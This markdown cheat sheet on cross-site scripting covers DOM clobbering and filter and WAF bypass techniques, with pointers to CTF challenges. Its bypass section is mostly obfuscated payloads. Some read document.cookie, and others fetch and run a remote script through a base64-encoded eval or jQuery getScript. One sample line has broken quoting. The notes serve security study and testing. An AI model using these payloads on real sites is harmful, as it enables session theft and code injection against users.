# XSS

## Awesome Cheat Sheets

- [PayloadsAllTheThings XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## Awesome Tools

- [XSS'OR - Hack with Javascript](http://xssor.io/#ende) - swisskey for payload editing

## DOM Based XSS

Useful references:
- [Introduction to the DOM](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction),
- [DOM Tree](https://developer.mozilla.org/en-US/docs/Web/API/Document_object_model/Using_the_W3C_DOM_Level_1_Core),
- [Window](https://developer.mozilla.org/en-US/docs/Web/API/Window).

### DOM Clobbering

DOM Clobbering allows defining certain variables in the window’s context. For example, an HTML element 
```html
<p id="CONFIG"></p>
```
 creates a reference to itself under a `window.CONFIG` variable if and only if there were no other variables declared 
 with the same name.

References:

- [Clobbering the clobbered — Advanced DOM Clobbering](https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94)

## Bypass

### Filter

---

#### Bypass using JS-Alpha

[JS-Alpha](https://github.com/terjanq/JS-Alpha) converts any javascript code into a code that only consists of 
 `/[a-z().]/` characters. Example:

```
with(escape())with(eval.bind)eval(unescape(match().concat(strike().big().link().length).concat(escape(escape.name.length).concat(escape(...call.name))).concat(escape(escape(link())).length).concat(link().blink().link().length).concat(link().link().strike().length).concat(name.link().length).concat(big().big().length).concat(link().length).concat(link().length).concat(strike().big().length).concat(fixed().big().length).join(unescape(...escape(this)))))
```

The generated code should work on all platforms. It uses only standardized functions.

#### Bypass using JS global variables

Global variable example:

```js
window["document"]["cookie"]
```

Call `alert` from `window` example:

```js
window["alert"](window["document"]["cookie"]);
self[/*foo*/"alert"](self[document"/*bar*/]["cookie"]);
```

Techniques to bypass WAF rules:

```js
// Concatenation sequences
self["ale"+"rt"](self["doc"+"ument"]["coo"+"kie"]);

// Hex escape sequences
// alert(document.cookie)
self["\x61\x6c\x65\x72\x74"](
    self["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]
        ["\x63\x6f\x6f\x6b\x69\x65"]
);

// Eval and Base64 encoded strings
self["\x65\x76\x61\x6c"](
  self["\x61\x74\x6f\x62"](
    "dmFyIGhlYWQgPSBkb2N1bWVudC5nZXRFbGVtZW50\
    c0J5VGFnTmFtZSgnaGVhZCcpLml0ZW0oMCk7dmFyI\
    HNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbn\
    QoJ3NjcmlwdCcpO3NjcmlwdC5zZXRBdHRyaWJ1dGU\
    oJ3R5cGUnLCAndGV4dC9qYXZhc2NyaXB0Jyk7c2Ny\
    aXB0LnNldEF0dHJpYnV0ZSgnc3JjJywgJ2h0dHA6L\
    y9leGFtcGxlLmNvbS9teS5qcycpO2hlYWQuYXBwZW\
    5kQ2hpbGQoc2NyaXB0KTs="
  )
);

// jQuery
self["$"]["globalEval"]("alert(1)");
self["\x24"]["\x67\x6c\x6f\x62\x61\x6c\x45\x76\x61\x6c"]("\x61\x6c\x65\x72\x74\x28\x31\x29");
// getScript loads a JavaScript file from the server using a GET HTTP request, then execute it.
self["$"]["getScript"]("https://vulnerable-website.com/my.js");

// Iteration and Object.keys
Object.keys(self)[5]; // "alert"
self[Object.keys(self)[5]]("foo"); // alert("foo")
```

References:

- [Bypass XSS filters using JavaScript global variables](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/amp/?__twitter_impression=true)

#### Bypass using JSFuck

[JSFuck](http://www.jsfuck.com/) is an esoteric and educational programming style based on the atomic parts of JS.
 It uses only six different characters to write and execute code. But the payload is very long. You can reduce the 
 payload using the methods described in the article [Bypass Uppercase filters like a PRO (XSS Advanced Methods)](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce).

#### Bypass using a little known JS comment style

A little known JS comment style [SingleLineHTMLOpenComment](https://www.ecma-international.org/ecma-262/10.0/index.html#prod-annexB-SingleLineHTMLOpenComment)
 and [HTMLCloseComment](https://www.ecma-international.org/ecma-262/10.0/index.html#prod-annexB-HTMLCloseComment)
 in ECMA specification. The following is valid JS comment syntax:

```js
-->valid_comment_style
```

References:

- [HITCON CTF 2019 - Bounty Pl33z Task](https://github.com/orangetw/My-CTF-Web-Challenges#bounty-pl33z)
- [HITCON CTF 2019 - Bounty Pl33z Writeup by balsn](https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#bounty-pl33z)
- [Challenge in Cure53 XSS wiki (the idea for the Bounty Pl33z)](https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#level-8)
